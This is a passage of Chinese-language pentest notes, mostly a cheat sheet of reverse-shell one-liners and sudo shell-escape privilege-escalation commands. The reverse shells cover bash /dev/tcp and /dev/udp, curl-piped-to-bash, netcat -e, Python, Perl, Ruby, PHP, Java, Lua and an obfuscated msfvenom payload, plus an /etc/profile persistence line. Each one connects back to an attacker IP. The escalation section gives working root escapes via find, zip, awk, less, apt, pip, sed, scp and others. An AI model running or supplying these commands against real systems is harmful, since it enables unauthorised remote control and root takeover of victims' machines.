+<h3 id="Bash-反弹-shell-UDP"><a href="#Bash-反弹-shell-UDP" class="headerlink" title="Bash 反弹 shell UDP"></a><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">Bash 反弹 shell UDP</font></h3><table>
+<thead>
+<tr>
+<th><code>plain # Alice nc -u -lvvp 4242 # Bob sh -i &gt;&amp; /dev/udp/127.0.0.1/4242 0&gt;&amp;1 </code></th>
+</tr>
+</thead>
+</table>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">以下是针对Bash反弹一句话进行了拆分说明：</font></p>
+<table>
+<thead>
+<tr>
+<th><font style="color:rgb(51, 51, 51);">命令</font></th>
+<th><font style="color:rgb(51, 51, 51);">命令详解</font></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code><font style="color:rgb(51, 51, 51);">bash -i</font></code></td>
+<td><font style="color:rgb(51, 51, 51);">产生一个bash交互环境。</font></td>
+</tr>
+<tr>
+<td><code><font style="color:rgb(51, 51, 51);">&gt;&amp;</font></code><font style="color:rgb(51, 51, 51);">（和2&gt;&amp;1  一个意思）</font></td>
+<td><font style="color:rgb(51, 51, 51);">将联合符号前面的内容与后面相结合，然后一起重定向给后者。</font></td>
+</tr>
+<tr>
+<td><code><font style="color:rgb(51, 51, 51);">/dev/tcp/47.xxx.xxx.72/2333</font></code></td>
+<td><font style="color:rgb(51, 51, 51);">Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</font></td>
+</tr>
+<tr>
+<td><code><font style="color:rgb(51, 51, 51);">0&gt;&amp;1</font></code></td>
+<td><font style="color:rgb(51, 51, 51);">将标准输入与标准输出的内容相结合，然后重定向给前面标准输</font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">出的内容。</font></td>
+</tr>
+</tbody></table>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">Bash反弹一句完整的解读过程就是：</font></p>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</font></p>
+<h2 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">Curl配合Bash反弹shell</font></h2><p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">首先，在攻击者vps的web目录里面创建一个</font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">index.php</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">或</font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">index.html</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">,内容如下：</font></p>
+<p>| <code>plain # Alice echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.64.215/2333 0&gt;&amp;1&#39; &gt; index.html # 临时起Web服务的三种方法 # python -m SimpleHTTPServer 8080 # python3 -m http.server 8080 # php -S 0.0.0.0:8080 # 监听 nc -lvvp 2333  # Bob curl 192.168.64.215|bash </code>  |<br>| — |</p>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">Curl 配合 Bash 反弹 shell 的方式在 CTF（Capture The Flag）题目中经常被使用。具体的命令是 </font><code><font style="color:rgb(245, 57, 0);">curl IP|bash</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">，其中的 IP 可以是任意格式，包括但不限于十进制、十六进制、八进制和二进制等。</font></p>
+<h2 id="NC反弹"><a href="#NC反弹" class="headerlink" title="NC反弹"></a>NC反弹</h2><p><font style="color:rgb(77, 77, 77);background-color:rgb(241, 242, 243);">netcat -e 被阉割的话</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">cd tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Alice</span><br><span class="line">nc -lvvp 2333</span><br><span class="line"># Bob</span><br><span class="line">netcat 192.168.64.215 2333 -e /bin/bash</span><br><span class="line"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="Crontab反弹shell"><a href="#Crontab反弹shell" class="headerlink" title="Crontab反弹shell"></a>Crontab反弹shell</h2><h2 id="Profile反弹shell"><a href="#Profile反弹shell" class="headerlink" title="Profile反弹shell"></a><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">Profile反弹shell</font></h2><p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">当用户打开新的 bash 窗口时，</font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">/etc/profile</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">文件中的内容会被执行。</font></p>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">需要注意的是，对</font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);"> </font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">/etc/profile</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">文件的修改需要进行管理员权限操作（例如使用</font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);"> </font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">sudo</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">或以管理员身份登录）。</font></p>
+<table>
+<thead>
+<tr>
+<th><code>plain /bin/bash -i &gt;&amp; /dev/tcp/192.168.64.215/2333 0&gt;&amp;1 &amp; # 最后面那个&amp;为的是防止管理员无法输入命令 </code></th>
+</tr>
+</thead>
+</table>
+<h2 id="MSF反弹shell"><a href="#MSF反弹shell" class="headerlink" title="MSF反弹shell"></a>MSF反弹shell</h2><p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">使用命令</font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);"> </font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">msfvenom -l</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">结合关键字过滤（例如</font><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);"> </font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">cmd/unix/reverse</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">），可以列出符合条件的各类反弹shell一句话payload，具体使用方法如下：</font></p>
+<p>| <code>plain ┌──(root㉿kali)-[/home/kali] └─# msfvenom -l payloads | grep &quot;cmd/unix/reverse&quot; </code>  |<br>| — |</p>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">以上命令将在所有可用的payload中筛选并列出符合关键字</font><code><font style="color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);">cmd/unix/reverse</font></code><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">的项，这些项包含各种反弹shell一句话payload的生成参数和选项。</font></p>
+<p><font style="color:rgb(51, 51, 51);background-color:rgb(249, 250, 251);">如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：</font></p>
+<table>
+<thead>
+<tr>
+<th><code>plain ┌──(root㉿kali)-[/home/kali] └─# msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=2333 -f raw [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 356 bytes python -c &quot;exec(<strong>import</strong>(&#39;zlib&#39;).decompress(<strong>import</strong>(&#39;base64&#39;).b64decode(<strong>import</strong>(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;eNqNUMEKgzAM/RXpqYJUrYcdRg8yHIyxDaZ3mV1FmWuKqf+/FoXRmwlJSPLyHmT8GphthCA/ykZRgktnZpAK0TXg0mZHFwOgFSTnB5Y5z0mw9DSCF0URTFGszGwtdOvKc3u5V43XWwf143Rt6+ZZlbc4JGAStFbSUurl3YUXikMQIHsvhlNk/TgpDdStk2wHJt+B4SHGiP+LmHxNEyVpN+oUBxL/AAt8WAg=&#39;)[0])))&quot;  ┌──(root㉿kali)-[/home/kali] └─# nc -lvvp 2333 </code></th>
+</tr>
+</thead>
+</table>
+<h2 id="常见脚本"><a href="#常见脚本" class="headerlink" title="常见脚本"></a>常见脚本</h2><p><strong><font style="color:rgb(26, 26, 26);">1. Python</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(26, 26, 26);">2. Perl</font></strong></p>
+<p><font style="color:rgb(26, 26, 26);">方法一：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(26, 26, 26);">方法二：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(26, 26, 26);">3. Ruby</font></strong></p>
+<p><font style="color:rgb(26, 26, 26);">方法一：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(26, 26, 26);">方法二：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;x.x.x.x&quot;,5555).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(26, 26, 26);">4. PHP</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(26, 26, 26);">5. Java</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Revs &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    */</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(26, 26, 26);">6. Lua</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;x.x.x.x&#x27;,&#x27;5555&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(26, 26, 26);">注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听:</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure>
+
+<h1 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h1><h2 id="初始尝试"><a href="#初始尝试" class="headerlink" title="初始尝试"></a>初始尝试</h2><p><font style="color:rgb(36, 41, 47);">通过使用交换用户</font><code><font style="color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);">su</font></code><font style="color:rgb(36, 41, 47);">命令生成root</font></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(36, 41, 47);">其他方法\ </font><font style="color:rgb(36, 41, 47);">有些时候不允许执行 su 计划，则有许多其他方法可以升级特权：</font></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -s </span><br><span class="line">sudo -i </span><br><span class="line">sudo /bin/bash </span><br><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="外壳逃生序列"><a href="#外壳逃生序列" class="headerlink" title="外壳逃生序列"></a><font style="color:rgb(36, 41, 47);">外壳逃生序列</font></h2><p><strong><font style="color:rgb(51, 51, 51);">以下这些程序如果被配置使用root权限启动，且该第三方服务或者程序存在漏洞或者配置问题，那么就可以被利用来获得root权限</font></strong><font style="color:rgb(51, 51, 51);">。** 并且还要知道当前用户的密码 **\ </font><font style="color:rgb(51, 51, 51);">可以利用sudo提权的命令如下 ：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget、find、cat、apt、zip、xxd、time、taskset、</span><br><span class="line">git、sed、pip、ed、tmux、scp、perl、bash、</span><br><span class="line">less、awk、man、vi、env、ftp</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(51, 51, 51);">查看用户能以root权限运行的命令  sudo -l </font></p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>这里查看详细方法</p>
+<h3 id="01-git-提权"><a href="#01-git-提权" class="headerlink" title="01.git 提权"></a><font style="color:rgba(0, 0, 0, 0.85);">01.git 提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo git help add</span><br><span class="line">sudo git help config</span><br><span class="line">sudo git -p help</span><br><span class="line">//三选一</span><br><span class="line">输密码</span><br><span class="line">再</span><br><span class="line">!/bin/bash</span><br><span class="line">即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="02-find提权"><a href="#02-find提权" class="headerlink" title="02.find提权"></a><font style="color:rgba(0, 0, 0, 0.85);">02.find提权</font></h3><p><font style="color:rgb(51, 51, 51);">普通用户find命令提权</font><strong><font style="color:rgb(51, 51, 51);">必要条件：find必须有s执行权限，有s表示可以提权</font></strong><font style="color:rgb(51, 51, 51);">\ </font><font style="color:rgb(51, 51, 51);">先查看find命令有没有提权的可能:\ </font><img src="/./img/Cox7JkxS9VkQluZG/1763386674993-47c09a31-0a67-4eb5-beac-512f58af3769-730063.jpeg" alt="1763386674993-47c09a31-0a67-4eb5-beac-512f58af3769.jpeg"><font style="color:rgb(51, 51, 51);">\ </font><font style="color:rgb(51, 51, 51);">尝试执行whoami :</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name getroot -exec &quot;whoami&quot; \;</span><br><span class="line">这里的反斜杠\是用来转义分号;的</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763386675081-40be7c6e-ab51-411e-9362-da53f429aabc-909467.jpeg" alt="1763386675081-40be7c6e-ab51-411e-9362-da53f429aabc.jpeg"><font style="color:rgb(51, 51, 51);">\ </font><font style="color:rgb(51, 51, 51);">尝试调出一个交互式的bin&#x2F;sh并且是root权限</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -exec /bin/bash \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763386675097-adcf53ea-9892-4d14-978d-77893c2b906c-576931.jpeg" alt="1763386675097-adcf53ea-9892-4d14-978d-77893c2b906c.jpeg"><font style="color:rgb(51, 51, 51);">\ </font><font style="color:rgb(51, 51, 51);">此shell 为不完整的shell， 升级交互式。</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#在反弹shell上执行</span><br><span class="line">[root@localhost ~]# python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">[root@localhost ~]# ctrl +z 按键。挂起正在运行的程序</span><br><span class="line">[kali机器 ~]# stty raw -echo</span><br><span class="line"># 输入这个命令 在输入命令终端不再显示</span><br><span class="line">[kali机器 ~]#fg</span><br><span class="line"># 把后台挂起的程序，放入到控制台。终端不再显示命令，输入后回撤</span><br><span class="line">[root@localhost ~]# reset</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(51, 51, 51);">用find进行反弹shell</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec bash -ip &gt;&amp; /dev/tcp/192.168.1.130/2333 0&gt;&amp;1 \;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \;</span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(51, 51, 51);">find+python进行反弹shell</font></strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc/passwd -exec python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.130&quot;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-ip&quot;]);&#x27; \;</span><br></pre></td></tr></table></figure>
+
+<h3 id="03-zip提权-核心sudo没有该命令-失效"><a href="#03-zip提权-核心sudo没有该命令-失效" class="headerlink" title="03.zip提权( 核心sudo没有该命令,失效 )"></a><font style="color:rgba(0, 0, 0, 0.85);">03.zip提权( 核心</font><strong><font style="color:rgba(0, 0, 0, 0.85);">sudo</font></strong><font style="color:rgba(0, 0, 0, 0.85);">没有该命令,失效 )</font></h3><p><font style="color:rgb(51, 51, 51);">zip 命令用于压缩文件，是个 使用广泛的压缩程序，压缩后的文件后缀名为 .zip。通过压缩一个存在的文件，并调用-T参数输出shell\ </font><font style="color:rgb(51, 51, 51);">1. 下载zip（如果没有）</font><strong><font style="color:rgb(51, 51, 51);">apt install zip</font></strong><font style="color:rgb(51, 51, 51);">\ </font><font style="color:rgb(51, 51, 51);">2. 创建一个1.txt，将其压缩为1.zip\ </font><font style="color:rgb(51, 51, 51);">3. 执行</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch 1.txt</span><br><span class="line">sudo zip 1.zip 1.txt -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br><span class="line">或</span><br><span class="line">touch 1.txt</span><br><span class="line">sudo -u root zip 1.zip 1.txt -T -unzip-command=&quot;sh -c /bin/bash&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="04-awk-morpheus提权"><a href="#04-awk-morpheus提权" class="headerlink" title="04.awk&#x2F;morpheus提权"></a><font style="color:rgba(0, 0, 0, 0.85);">04.awk&#x2F;morpheus提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="line">sudo morpheus &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="05-less-more-提权"><a href="#05-less-more-提权" class="headerlink" title="05.less**&#x2F;more**提权"></a><font style="color:rgba(0, 0, 0, 0.85);">05.less**&#x2F;more**提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">!bash</span><br><span class="line">//若已被分配root权限</span><br><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="06-man提权"><a href="#06-man提权" class="headerlink" title="06.man提权"></a><font style="color:rgba(0, 0, 0, 0.85);">06.man提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="07-env提权"><a href="#07-env提权" class="headerlink" title="07.env提权"></a><font style="color:rgba(0, 0, 0, 0.85);">07.env提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo env /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="08-ed提权"><a href="#08-ed提权" class="headerlink" title="08.ed提权"></a><font style="color:rgba(0, 0, 0, 0.85);">08.ed提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ed</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="09-apt提权"><a href="#09-apt提权" class="headerlink" title="09.apt提权"></a><font style="color:rgba(0, 0, 0, 0.85);">09.apt提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;Dpkg::Pre-Invoke &#123;&quot;/bin/sh;false&quot;&#125;&#x27; &gt; $TF</span><br><span class="line">sudo apt-get install -c $TF sl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763386675072-3f869588-528f-4d36-aec7-1426f1e4f639-951921.jpeg" alt="1763386675072-3f869588-528f-4d36-aec7-1426f1e4f639.jpeg"></p>
+<h3 id="10-pip提权"><a href="#10-pip提权" class="headerlink" title="10.pip提权"></a><font style="color:rgba(0, 0, 0, 0.85);">10.pip提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-sed提权"><a href="#11-sed提权" class="headerlink" title="11.sed提权"></a><font style="color:rgba(0, 0, 0, 0.85);">11.sed提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -n &#x27;1e exec sh 1&gt;&amp;0&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-tmux提权"><a href="#12-tmux提权" class="headerlink" title="12.tmux提权"></a><font style="color:rgba(0, 0, 0, 0.85);">12.tmux提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tmux</span><br></pre></td></tr></table></figure>
+
+<h3 id="13-nmap提权"><a href="#13-nmap提权" class="headerlink" title="13.nmap提权"></a><font style="color:rgba(0, 0, 0, 0.85);">13.</font><strong><font style="color:rgba(0, 0, 0, 0.85);">nmap</font></strong><font style="color:rgba(0, 0, 0, 0.85);">提权</font></h3><p><font style="color:rgb(51, 51, 51);">版本5.0一下\ </font><font style="color:rgb(51, 51, 51);"><em>进入nmap交互模式</em></font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --interactive</span><br></pre></td></tr></table></figure>
+
+<h3 id="14-taskset提权"><a href="#14-taskset提权" class="headerlink" title="14.taskset提权"></a><font style="color:rgba(0, 0, 0, 0.85);">14.taskset提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo taskset 1 /bin/sh -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="15-scp提权"><a href="#15-scp提权" class="headerlink" title="15.scp提权"></a><font style="color:rgba(0, 0, 0, 0.85);">15.scp提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; &gt; $TF</span><br><span class="line">chmod +x &quot;$TF&quot;</span><br><span class="line">sudo scp -S $TF x y:</span><br></pre></td></tr></table></figure>
+
+<h3 id="16-ftp提权"><a href="#16-ftp提权" class="headerlink" title="16.ftp提权"></a><font style="color:rgba(0, 0, 0, 0.85);">16.ftp提权</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ftp </span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
